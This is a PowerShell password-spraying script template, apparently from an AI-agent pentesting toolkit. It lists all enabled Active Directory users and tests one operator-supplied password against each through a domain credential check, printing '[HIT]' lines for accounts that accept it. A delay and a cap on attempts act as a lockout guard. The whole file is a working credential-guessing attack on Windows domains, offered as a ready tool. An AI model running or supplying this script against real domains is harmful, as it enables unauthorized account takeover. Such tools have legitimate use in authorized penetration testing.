# password_spray_local — careful single-password spray with lockout guard
# OCD mindmap: Got valid username → spray
# Parameters:
#   {password}   — single password to try (operator-supplied)
#   {userlist}   — newline-separated SamAccountNames; default = all enabled users
#   {lockout_flags} — injected by lockout_guard (delay + max attempts)
# The agent refuses to run spray commands where {password} is unresolved.
$ErrorActionPreference = 'SilentlyContinue'

$password = '{password}'
if ($password -match '^\{.*\}$' -or -not $password) {
    throw "password parameter required — refusing to spray without it"
}

$lockout_delay = [int](($null -ne '{delay_seconds}' -and '{delay_seconds}' -notmatch '^\{') ? '{delay_seconds}' : 30)
$max_attempts  = [int](($null -ne '{max_attempts}' -and '{max_attempts}' -notmatch '^\{') ? '{max_attempts}' : 3)

$users = @()
$ul = '{userlist}'
if ($ul -and $ul -notmatch '^\{') {
    $users = $ul -split '\s+' | Where-Object { $_ }
} else {
    try {
        $users = (Get-ADUser -Filter 'Enabled -eq $true' | Select-Object -ExpandProperty SamAccountName) -as [string[]]
    } catch {
        throw "No userlist provided and Get-ADUser unavailable"
    }
}

Write-Host "Spraying $password against $($users.Count) users, ${lockout_delay}s between attempts, max ${max_attempts}"

$ctx = 'domain'
$domain = $env:USERDNSDOMAIN
Add-Type -AssemblyName System.DirectoryServices.AccountManagement
$ctxObj = New-Object System.DirectoryServices.AccountManagement.PrincipalContext 'Domain', $domain

$attempts = 0
foreach ($u in $users) {
    if ($attempts -ge $max_attempts) {
        Write-Host "max_attempts reached, stopping (lockout guard)"
        break
    }
    try {
        $ok = $ctxObj.ValidateCredentials($u, $password)
        if ($ok) {
            Write-Host "[HIT] $u : $password"
        } else {
            Write-Host "[miss] $u"
        }
    } catch {
        Write-Host "[err] $u : $_"
    }
    $attempts++
    Start-Sleep -Seconds $lockout_delay
}
